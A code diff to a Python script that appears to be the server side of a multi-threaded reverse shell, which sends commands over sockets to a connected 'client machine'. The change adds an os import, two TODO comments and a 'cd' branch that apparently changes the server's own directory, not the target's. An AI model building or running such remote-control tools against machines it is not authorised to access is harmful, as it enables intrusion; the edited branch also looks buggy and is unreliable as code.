@@ -1,4 +1,4 @@
-import socket, sys, threading, time
+import socket, sys, threading, os, time
 from queue import Queue
 
 NUMBER_OF_THREADS = 2
@@ -125,6 +125,8 @@ def get_target(cmd):
 
 
 #Sending commands to client machine
+#TODO: create an app that notifies you on all UTD games
+#TODO: work on cd conditional below
 def send_target_commands(conn):
     while True:
         try:
@@ -139,6 +141,10 @@ def send_target_commands(conn):
                 client_response = str(conn.recv(20480), "utf-8")
                 print(client_response, end="")
                 continue
+            elif cmd[:2] == 'cd':
+                os.chdir(cmd[3:])
+                currentWD = os.getcwd() + "> "
+                print(currentWD)
         except:
             print("Error sending commands")
             break
